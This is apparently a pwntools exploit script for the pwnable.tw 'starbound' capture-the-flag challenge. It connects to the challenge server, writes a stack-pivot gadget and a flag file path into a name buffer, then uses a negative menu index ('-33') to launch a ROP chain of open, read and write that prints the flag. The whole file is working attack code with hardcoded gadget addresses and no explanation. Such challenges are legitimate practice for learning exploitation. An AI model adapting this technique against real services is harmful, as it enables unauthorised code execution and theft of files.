
from pwn import *
#p = process('./starbound')
p = remote('chall.pwnable.tw',10202)
bin = ELF('./starbound')
context.log_level = 'debug'

def create_name(name):
        p.sendlineafter('> ','6')
        p.sendlineafter('> ','2')
        p.sendafter('Enter your name: ',name)
        p.sendlineafter('> ','1')
def choice(cmd):
        p.sendafter('> ',cmd)   #me(0x8057f80) + lVar2*4 + 0x1d4


#gdb.attach(p,"""break *0x804a65d""")

name_add = 0x80580d0    # address name string
me = 0x8057f80          # me is (me + 0 + 0x1d4)
read = 0x8048a70        #read@plt
open = 0x8048970        #open@plt
write = 0x8048a30       #write@plt
pop3 = 0x80494da        #pop ebx ; pop esi ; pop edi ; ret
addesp = 0x08048e48     # add esp, 0x1c ; ret

payload = p32(addesp) + '/home/starbound/flag'+'\x00'
create_name(payload)
#pause()
#just use add esp, 0x1c and ret into open@plt; then read, write
payload = '-33'+'A'*5+p32(open)+p32(pop3)+p32(name_add+0x4)+p32(0)+p32(0)
payload += p32(read)+p32(pop3)+p32(0x3)+p32(name_add)+p32(0x100)
payload += p32(write)+p32(pop3)+p32(0x1)+p32(name_add)+p32(0x100)
choice(payload)
p.interactive()
